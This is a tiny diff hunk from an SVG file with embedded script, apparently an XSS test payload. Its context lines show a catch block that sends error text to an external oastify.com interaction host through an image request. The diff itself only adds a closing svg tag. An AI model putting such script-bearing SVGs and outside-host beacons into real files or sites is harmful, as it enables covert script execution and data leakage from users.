@@ -13,3 +13,4 @@ try {
   new Image().src = 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/error?msg=' + encodeURIComponent(e.message);
 }
 ">
+</svg>
